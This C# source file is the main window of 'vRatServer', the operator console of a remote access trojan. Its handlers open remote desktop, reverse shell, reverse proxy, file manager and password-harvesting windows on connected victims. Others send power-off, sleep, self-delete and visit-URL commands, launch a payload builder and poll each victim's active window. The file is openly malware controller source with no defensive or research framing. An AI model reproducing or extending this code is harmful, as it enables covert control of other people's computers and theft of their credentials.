using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using vRatServer.Classes;
using vRatServer.Forms;

namespace vRatServer
{
    public partial class MainForm : Form
    {
        public NotifyIcon n = new NotifyIcon();
        static int count = 0;
        static string orgname = "";
        

        

       
        public void updateCount(bool connected)
        {
            if (connected) { count++; }
            else { count--; }
            this.Text = orgname+"       [Connected : " + count.ToString() + " ]";

        }
        public MainForm()
        {
            InitializeComponent();
        }

        public void changeStatus(bool started,ushort port)
        {
            if (started)
            {
                toolStripStatusLabel1.Text = "Listening On port : " + port.ToString();
            }
            else
            {
                toolStripStatusLabel1.Text = "Not Listening";


            }
        }
        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {

        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var f = new SettingsForm(this);
            f.Show();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            orgname = this.Text;
            

        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var f = new AboutForm();
            f.Show();
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {

                Client cli = (Client)i.Tag;
                if (cli.cf == null)
                {
                    var f = new RemoteDesktop(cli);

                    f.Show();
                }
                else
                {
                    cli.cf.BringToFront();
                }
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }
            var i = t[0];
            Client cli = (Client)i.Tag;
            var f = new Proxy(cli);
            f.Show();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;
                if (cli.fmf != null) { cli.fmf.BringToFront(); }
                else
                {
                    var f = new FileManagerForm(cli);

                    f.Show();
                }
            }
        }

        private void reverseShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;
                if (cli.rsf == null) {
                    var f = new ReverseShellform(cli);
                    f.Show();
                }
                else
                {
                    cli.rsf.BringToFront();
                }
                
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {


            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;
                cli.client.Close();

            }


        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (MessageBox.Show("Are you sure you want to delete the client ?", "Confirm", MessageBoxButtons.YesNo,MessageBoxIcon.Warning) == DialogResult.No)
            {
                return;
            }


            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            byte [] r = null;
            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;

                globals.SendPacket(cli, (byte)globals.PacketType.selfdelete, 0,0, ref r);

            }


        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var f = new Builder();
            f.Show();
        }

        private void miscellaneousToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {

                Client cli = (Client)i.Tag;
                if (cli.tkm == null)
                {
                    var f = new TaskManager(cli);

                    f.Show();
                }
                else
                {
                    cli.tkm.BringToFront();
                }
            }
        }

        private void powerOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to poweroff ?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
            {
                return;
            }
            var t = listView1.SelectedItems;
            byte[] r = null;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {

                Client cli = (Client)i.Tag;
                globals.SendPacket(cli, (byte)globals.PacketType.poweroff,0, 0, ref r);
            }
        }

        private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you want to sleep ?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
            {
                return;
            }
            var t = listView1.SelectedItems;
            byte[] r = null;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {

                Client cli = (Client)i.Tag;
                globals.SendPacket(cli, (byte)globals.PacketType.sleep, 0, 0, ref r);
            }


        }

        private void visitUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {

            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }

            List<Client> clients = new List<Client>();


            foreach (ListViewItem i in t)
            {

                Client cli = (Client)i.Tag;
                clients.Add(cli);
            }
            var f = new VisitUrl(clients);
            f.Show();

        }

 
        private void getWindowUpdatesTimer_Tick(object sender, EventArgs e)
        {
            byte[]? r = null;
            foreach (ListViewItem item in Program.f1.listView1.Items)
            {
                Client cli = (Client)item.Tag;
                globals.SendPacket(cli, (byte)globals.PacketType.getwindow, 0, 0, ref r);


            }
        }

       

        private void onDisconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;
                if (cli.ondsc == null)
                {
                    var f = new Forms.OnDisconnect(cli);
                    f.Show();
                }
                else
                {
                    cli.ondsc.BringToFront();
                }

            }
        }

       

        private void passwordManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }


            foreach (ListViewItem i in t)
            {
                Client cli = (Client)i.Tag;
                if (cli.pam == null)
                {
                    var f = new Forms.PasswordManager(cli);
                    f.Show();
                }
               else
                {
                    cli.pam.BringToFront();
                }

            }
        }
    }
    }
